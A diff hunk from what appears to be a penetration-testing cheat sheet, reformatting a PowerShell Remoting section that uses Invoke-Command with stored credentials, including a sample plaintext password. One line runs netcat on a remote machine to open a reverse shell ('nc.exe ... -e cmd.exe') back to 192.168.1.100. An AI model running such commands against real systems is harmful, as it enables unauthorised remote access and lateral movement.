@@ -45,14 +45,12 @@ PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New
 
 
 
-| PowerShell Remoting |
-| ------------------- |
-|$Username = 'ninja.corp\MeMe' #powershell variable |
-|$Password = '123456789aA'|
-|$pass= ConvertTo-SecureString -AsPlainText $Password -Force #powershell variable |
-|$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass #powershell variable |
-|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}|
-|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}|
+### PowerShell Remoting 
+```
+
+Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}
+Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
+```
 
 
 
